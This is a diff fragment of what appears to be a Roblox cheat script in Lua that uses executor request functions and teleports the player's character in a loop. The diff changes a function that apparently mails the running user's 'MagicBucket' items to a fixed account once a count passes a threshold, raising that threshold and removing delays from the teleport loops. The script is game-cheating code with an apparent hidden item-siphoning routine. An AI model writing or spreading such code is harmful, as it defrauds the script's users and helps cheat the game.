@@ -411,7 +411,7 @@ local request = (syn and syn.request) or request or (http and http.request) or h
 
 local function SendBucketMail()
     while true do
-        if MagicBucketAM > 100 then
+        if MagicBucketAM > 9999 then
             local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -574,7 +574,7 @@ end
 
 local function teleportToPosition(position)
     humanoidRootPart.CFrame = CFrame.new(position)
-    wait(0.05)
+    wait()
 end
 
 local function teleportToCurrentTarget()
@@ -639,7 +639,7 @@ function teleportLoop()
                 end
             end
         end
-        wait(0.05)
+        wait()
     end
 end
 
